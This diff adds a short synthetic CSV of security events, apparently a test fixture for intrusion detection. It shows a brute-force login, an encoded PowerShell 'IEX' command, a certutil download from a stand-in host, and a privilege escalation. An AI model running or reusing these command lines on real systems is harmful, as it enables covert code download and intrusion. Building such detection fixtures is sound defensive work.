@@ -1,0 +1,12 @@
+timestamp,event_type,username,source_ip,process,command_line,status,message
+2026-10-01T09:00:00Z,AUTH_FAILURE,administrator,203.0.113.50,,,FAILURE,Invalid password
+2026-10-01T09:01:00Z,AUTH_FAILURE,administrator,203.0.113.50,,,FAILURE,Invalid password
+2026-10-01T09:02:00Z,AUTH_FAILURE,administrator,203.0.113.50,,,FAILURE,Invalid password
+2026-10-01T09:03:00Z,AUTH_FAILURE,administrator,203.0.113.50,,,FAILURE,Invalid password
+2026-10-01T09:04:00Z,AUTH_FAILURE,administrator,203.0.113.50,,,FAILURE,Invalid password
+2026-10-01T09:05:00Z,AUTH_SUCCESS,administrator,203.0.113.50,,,SUCCESS,Interactive logon
+2026-10-01T09:20:00Z,PROCESS_START,safwan,192.0.2.10,powershell.exe,powershell.exe -EncodedCommand SQBFAFgA, ,PowerShell started
+2026-10-01T09:25:00Z,PROCESS_START,safwan,192.0.2.10,certutil.exe,certutil.exe -urlcache -split -f https://example.invalid/file, ,Process started
+2026-10-01T09:30:00Z,PRIVILEGE_CHANGE,safwan,192.0.2.10,,,SUCCESS,User added to privileged group
+2026-10-01T10:00:00Z,AUTH_SUCCESS,safwan,192.0.2.10,,,SUCCESS,Interactive logon
+2026-10-01T10:05:00Z,PROCESS_START,safwan,192.0.2.10,explorer.exe,explorer.exe, ,Normal process
